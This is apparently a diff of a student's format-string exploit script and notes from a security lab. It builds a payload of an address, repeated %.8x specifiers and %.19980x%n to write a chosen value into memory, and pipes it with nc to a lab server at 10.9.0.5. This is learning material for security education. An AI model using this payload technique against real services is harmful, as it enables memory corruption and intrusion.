@@ -6,7 +6,7 @@ def task(address, N, target_value):
 
     content[0:4] = (address).to_bytes(4, byteorder='little')
 
-    printed = 4 + 8*(N-2) # 4 bytes for the address and 8 + 8 for 2 %.8x
+    printed = 4 + 8*(N-2) # 4 bytes for the address and (N-2)*8 bytes for the %.8x
 
     count = target_value - printed
     pattern = '{Prefix}%.{C}x%n\n'
@@ -35,7 +35,10 @@ The {Prefix} print the address of stack, each one is 8 bytes, and other 4 byte f
 so we need to print another 0x5000 - 4 - 8*(N-2) bytes (count)
 
 if we run the code python3 task3B.py 64 && cat badfile | nc 10.9.0.5 9090
-%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.19980x%n
+%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x
+%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x
+%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x
+%.8x%.8x%.8x%.8x%.8x%.19980x%n
 
 the last part is %.19980x%n
 %.19980x will print 19980 bytes
